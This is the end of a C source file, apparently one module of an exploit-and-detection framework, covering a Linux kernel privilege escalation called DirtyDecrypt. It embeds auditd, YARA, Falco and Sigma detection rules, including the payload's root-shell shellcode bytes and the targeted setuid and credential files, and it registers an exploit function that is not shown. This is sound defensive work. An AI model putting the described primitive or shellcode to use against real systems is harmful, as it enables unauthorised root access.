
#endif /* __linux__ */

/* ---- detection rules (embedded) ----------------------------------- */

static const char dd_auditd[] =
	"# DirtyDecrypt (CVE-2026-31635) — auditd detection rules\n"
	"# rxgk in-place decrypt corrupts the page cache of a read-only file.\n"
	"# Watches every payload carrier in dd_targets[] plus credential files.\n"
	"-w /usr/bin/su     -p wa -k skeletonkey-dirtydecrypt\n"
	"-w /bin/su         -p wa -k skeletonkey-dirtydecrypt\n"
	"-w /usr/bin/mount  -p wa -k skeletonkey-dirtydecrypt\n"
	"-w /usr/bin/passwd -p wa -k skeletonkey-dirtydecrypt\n"
	"-w /usr/bin/chsh   -p wa -k skeletonkey-dirtydecrypt\n"
	"-w /etc/passwd     -p wa -k skeletonkey-dirtydecrypt\n"
	"-w /etc/shadow     -p wa -k skeletonkey-dirtydecrypt\n"
	"# AF_RXRPC socket creation by non-root (family 33) — core of the trigger\n"
	"-a always,exit -F arch=b64 -S socket -F a0=33 -k skeletonkey-dirtydecrypt-rxrpc\n"
	"# rxrpc security keys added to the keyring\n"
	"-a always,exit -F arch=b64 -S add_key -k skeletonkey-dirtydecrypt-key\n"
	"# splice() drives the page-cache pages into the forged DATA packet\n"
	"-a always,exit -F arch=b64 -S splice -k skeletonkey-dirtydecrypt-splice\n"
	"-a always,exit -F arch=b32 -S splice -k skeletonkey-dirtydecrypt-splice\n";

static const char dd_yara[] =
    "rule dirtydecrypt_payload_overlay : cve_2026_31635 page_cache_write\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2026-31635\"\n"
    "        description = \"DirtyDecrypt payload: the 120-byte ET_DYN x86_64 ELF the public V12 PoC overlays onto the first bytes of a setuid binary's page cache. Scan setuid-root binaries (/usr/bin/su etc.); legitimate binaries are much larger and never start with this exact shellcode.\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "        reference   = \"https://github.com/v12-security/pocs/tree/main/dirtydecrypt\"\n"
    "    strings:\n"
    "        // First 28 bytes of the embedded tiny_elf[] payload.\n"
    "        $payload_head = { 7F 45 4C 46 02 01 01 00 00 00 00 00 00 00 00 00 03 00 3E 00 01 00 00 00 68 00 00 00 }\n"
    "        // The setuid(0)+execve(/bin/sh) tail at offset 104 of the payload.\n"
    "        $shellcode    = { B0 69 0F 05 48 8D 3D DD FF FF FF 6A 3B 58 0F 05 }\n"
    "        $sh           = \"/bin/sh\"\n"
    "    condition:\n"
    "        // Setuid binaries are at minimum a few KB; the payload is\n"
    "        // 120 bytes overlaid at offset 0 so the rest of the file\n"
    "        // remains the original binary content (or padding).\n"
    "        $payload_head at 0 and $shellcode and $sh and filesize > 4096\n"
    "}\n";

static const char dd_falco[] =
    "- rule: AF_RXRPC socket created by non-root (DirtyDecrypt primitive)\n"
    "  desc: |\n"
    "    Non-root process creates an AF_RXRPC socket. AF_RXRPC is the\n"
    "    family the DirtyDecrypt (CVE-2026-31635) primitive needs to\n"
    "    trigger the rxgk in-place decrypt. Most production hosts do\n"
    "    not use AF_RXRPC at all (it's AFS-flavoured); a non-root\n"
    "    open here is highly suspicious.\n"
    "  condition: >\n"
    "    evt.type = socket and evt.arg[0] = 33 and not user.uid = 0\n"
    "  output: >\n"
    "    AF_RXRPC socket() by non-root (user=%user.name proc=%proc.name\n"
    "     pid=%proc.pid parent=%proc.pname)\n"
    "  priority: CRITICAL\n"
    "  tags: [process, mitre_privilege_escalation, T1068, cve.2026.31635]\n"
    "\n"
    "- rule: rxrpc security key added (DirtyDecrypt handshake setup)\n"
    "  desc: |\n"
    "    add_key(\"rxrpc\", …) by a non-root process — the DirtyDecrypt\n"
    "    PoC adds an rxrpc-typed key carrying a forged rxgk XDR token\n"
    "    for each fire() of the page-cache write primitive.\n"
    "  condition: >\n"
    "    evt.type = add_key and evt.arg[0] contains \"rxrpc\" and not user.uid = 0\n"
    "  output: >\n"
    "    rxrpc add_key by non-root (user=%user.name proc=%proc.name)\n"
    "  priority: WARNING\n"
    "  tags: [process, cve.2026.31635]\n";

static const char dd_sigma[] =
	"title: Possible DirtyDecrypt exploitation (CVE-2026-31635)\n"
	"id: 7c1e9a40-skeletonkey-dirtydecrypt\n"
	"status: experimental\n"
	"description: |\n"
	"  Detects the footprint of the rxgk page-cache write (DirtyDecrypt /\n"
	"  DirtyCBC, CVE-2026-31635): non-root creation of AF_RXRPC sockets\n"
	"  followed by modification of a setuid-root binary or /etc/passwd.\n"
	"logsource: {product: linux, service: auditd}\n"
	"detection:\n"
	"  modification:\n"
	"    type: 'PATH'\n"
	"    name|startswith: ['/usr/bin/su', '/bin/su', '/usr/bin/mount',\n"
	"      '/usr/bin/passwd', '/usr/bin/chsh', '/etc/passwd', '/etc/shadow']\n"
	"  not_root:\n"
	"    auid|expression: '!= 0'\n"
	"  condition: modification and not_root\n"
	"level: high\n"
	"tags: [attack.privilege_escalation, attack.t1068, cve.2026.31635]\n";

const struct skeletonkey_module dirtydecrypt_module = {
	.name           = "dirtydecrypt",
	.cve            = "CVE-2026-31635",
	.summary        = "rxgk missing-COW in-place decrypt → page-cache write into a setuid binary",
	.family         = "dirtydecrypt",
	.kernel_range   = "Linux 7.0 (vulnerable rxgk code added in 7.0); mainline fix commit a2567217 in 7.0",
	.detect         = dd_detect,
	.exploit        = dd_exploit,
	.mitigate       = NULL,
	.cleanup        = dd_cleanup,
	.detect_auditd  = dd_auditd,
	.detect_sigma   = dd_sigma,
	.detect_yara    = dd_yara,
	.detect_falco   = dd_falco,
};

void skeletonkey_register_dirtydecrypt(void)
{
	skeletonkey_register(&dirtydecrypt_module);
}
